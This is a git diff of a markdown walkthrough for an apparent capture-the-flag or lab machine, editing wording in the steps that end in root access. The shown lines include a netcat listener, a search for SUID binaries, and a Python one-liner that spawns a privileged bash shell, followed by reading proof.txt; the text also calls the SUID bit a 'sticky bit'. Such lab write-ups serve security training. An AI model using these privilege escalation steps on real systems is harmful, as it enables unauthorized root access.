@@ -92,7 +92,7 @@ nc -lvp 4444
 
 ![](https://raw.githubusercontent.com/samiux/images/master/october/014.png)
 
-After saved the page and ```review``` it.  The shell is ported accordingly.
+After saved the page and ```Preview``` it.  The shell is ported accordingly.
 
 ![](https://raw.githubusercontent.com/samiux/images/master/october/015.png)
 
@@ -102,7 +102,7 @@ The current user is ```www-data```.  We need to find a way for privilege escalat
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-The output shows that ```python3.7``` is in sticky bit.  We try to privilege escalate it using Python 3.
+The output shows that ```python3.7``` is in sticky bit.  We try to privilege escalate it by using ```bash``` pipelines in Python 3.
 
 ```bash
 python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
@@ -110,7 +110,7 @@ python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
 
 As a result, we get ```euid=0(root)``` after running the above command.
 
-We then go to the /root and display the ```proof.txt```.  Bingo!  Root is dancing!
+We then go to the ```/root``` and display the ```proof.txt```.  Bingo!  Root is dancing!
 
 ![](https://raw.githubusercontent.com/samiux/images/master/october/016.png)
 
